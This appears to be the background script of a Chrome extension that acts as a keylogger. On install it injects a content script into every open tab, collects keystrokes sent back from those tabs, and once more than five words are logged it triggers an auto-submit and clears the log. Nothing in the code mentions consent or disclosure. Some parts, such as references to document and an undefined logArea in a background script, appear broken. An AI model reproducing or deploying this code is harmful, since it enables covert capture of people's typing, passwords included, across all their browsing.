
chrome.runtime.onInstalled.addListener(() => {
    chrome.storage.local.set({ keyLogs: '' });
    injectScriptInAllTabs();
});

// Saves the log to Chrome's local storage.
function saveLogToStorage(keyLogs) {
    chrome.storage.local.set({ keyLogs });
}

// Clears the log from Chrome's local storage.
function clearLogFromStorage() {
    chrome.storage.local.set({ keyLogs: '' });
    logArea.value = '';
}

//  Appends a key to the existing log, checks the word count, and triggers auto-submit if necessary.
function appendKeyToLog(key) {
    chrome.storage.local.get(['keyLogs'], (result) => {
        let keyLogs = result.keyLogs || '';
        keyLogs += key;
        saveLogToStorage(keyLogs);

        const wordCount = keyLogs.trim().split(/\s+/).length;
        if (wordCount > 5) {
            
            triggerAutoSubmit(keyLogs, wordCount);
        }
    });
}

// Sends the auto-submit message and clears the storage.
function triggerAutoSubmit(log, wordCount) {
    chrome.runtime.sendMessage({ type: 'autoSubmit', data: log, length: wordCount });
    document.getElementById("send").click();
    clearLogFromStorage();
}


// Injects the content script into all open tabs.
function injectScriptInAllTabs() {
    chrome.tabs.query({}, (tabs) => {
        for (let i = 0; i < tabs.length; i++) {
            chrome.scripting.executeScript({
                target: { tabId: tabs[i].id },
                files: ['content.js']
            });
        }
    });
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === 'logKey') {
        appendKeyToLog(message.key);
    } else if (message.type === 'clearLogs') {
        clearLogFromStorage();
        sendResponse({ status: 'cleared' });
    }
});





